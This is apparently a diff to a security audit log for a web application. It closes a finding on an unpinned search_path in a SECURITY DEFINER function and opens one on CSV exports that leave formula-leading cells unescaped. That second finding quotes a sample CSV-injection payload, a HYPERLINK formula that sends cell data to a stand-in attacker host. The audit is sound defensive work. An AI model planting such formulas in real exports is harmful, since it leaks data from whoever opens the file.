 - **Independently verified:** ✓ **SURVIVES, corrected** — second independent adversarial pass. Severity **MEDIUM → LOW** by this pass. The factual claim is exactly right, and the deviation from the house convention is stark — the sibling helpers pin it (20261013:58 `... SECURITY DEFINER SET search_path = public`, whose own comment says "search_path pinned per the house SECURITY DEFINER pattern"; likewise 20260913:22,28,33,41). Lowering to LOW: exploitation requires a principal who can already CREATE a schema that precedes public on the role's search_path, which on a managed Supabase instance is an admin-level capability, so this is a defense-in-depth/linter-grade hardening gap (Supabase flags it as a WARN) rather than a reachable privilege escalation for any application role.
@@ -652,5 +773,50 @@ No `SET search_path`. The unqualified `org_members` and `auth.uid()` resolve thr
 - [ ] is_org_controller is recreated with `SET search_path = public` (or `= pg_catalog, public`), matching every other SECURITY DEFINER helper in the schema
 - [ ] a repo-wide check confirms no SECURITY DEFINER function lacks a pinned search_path — run `grep -rn 'SECURITY DEFINER' supabase/migrations/*.sql` and verify each hit
 - [ ] CREATE privilege on schemas ahead of public is confirmed to be denied to non-superuser roles as defense in depth
+
+**Resolution (2026-09-30, projects Round G).** Record-only close → roles-and-permissions `DB-6`: `supabase/migrations/20261020_pin_search_path.sql` pins `is_org_controller(uuid)` (`ALTER FUNCTION … SET search_path = public`, the `'is_org_controller(uuid)'` entry in its list). Re-verified at `2a2ae73`: `grep -rn 'FUNCTION is_org_controller' supabase/migrations` finds only the 20260814 definition, so no later migration re-created it without the pin; `lib/__tests__/searchPathPin.test.ts` replays the whole sequence and fails on any SECURITY DEFINER function whose final definition is unpinned and not covered by 20261020 — it passes on this branch, including the ten SECURITY DEFINER functions 20261102 / 20261103 define (all pinned at creation).
+
+**Done-when.**
+- is_org_controller is pinned — ✓ (20261020, DB-6).
+- A repo-wide check confirms no SECURITY DEFINER function lacks a pinned search_path — ✓ (`searchPathPin.test.ts`, in the loop).
+- CREATE on schemas ahead of public denied to non-superusers — ✓ by pointer to DB-6's record (a live-database property; nothing in this package changes it).
+
+**Scope / residual.** None.
+
+---
+
+
+<a id="pm-15"></a>
+
+## PM-15 · Six other CSV exports write formula-leading cells unescaped — PM-10's guard reached only the project export
+
+- **Severity:** MEDIUM
+- **Status:** OPEN
+- **Verification:** CONFIRMED (the producers located by `grep -rln 'text/csv' app lib components`; each builds its cells without `lib/csvSafe`)
+- **Locations:** `app/(protected)/admin/audit/page.tsx:450` (audit export), `app/(protected)/register/page.tsx:59-64` → `lib/docControlRegister.ts` `registerToCsv`, `app/(protected)/admin/permissions/page.tsx:209` → `lib/ownership.ts` `ownershipRegisterToCsv`, `app/(protected)/requests/page.tsx:587`, `app/api/knowledge/drawing/route.ts:147`, `components/cockpit/CommandDeck.tsx:342`
+- **Related:** `PM-10` (split from its done-when 2 per `DEC-31`)
+- **Independently verified:** — (`author`: opened by projects Round G while resolving `PM-10`; not yet challenged)
+
+**Mechanism.** `PM-10` added `lib/csvSafe.ts` (`csvCell` / `csvLine`: a value led
+by `= + - @ TAB CR` is written as an apostrophe-prefixed quoted cell) and moved
+the project export onto it. Six other producers build CSV cells with their own
+quoting, and none neutralises a formula-leading value. Their cells are
+user-typed too — document titles and numbers (register), audit details and
+user emails (audit export), ticket titles and requester names (requests),
+drawing text (knowledge), owner names (ownership register).
+
+**Failure scenario.** The same as `PM-10`: a document titled
+`=HYPERLINK("https://evil.example/?d="&A2,"Open")` becomes a live formula in
+the document-control register export an auditor opens in Excel.
+
+**Remediation.** Route each producer's cell encoding through `csvCell` (the
+files belong to document-control P10, admin-and-org and drafting-flow
+packages — each adopts it in its own file). `lib/dataExport.ts` /
+`lib/exportTables.ts` write JSON and `lib/xlsxData.ts` only reads workbooks;
+they need nothing.
+
+**Done when.**
+- Every CSV producer in the repo encodes its cells through `lib/csvSafe`.
+- A census test fails for a new `text/csv` producer that does not import it.
 
 ---
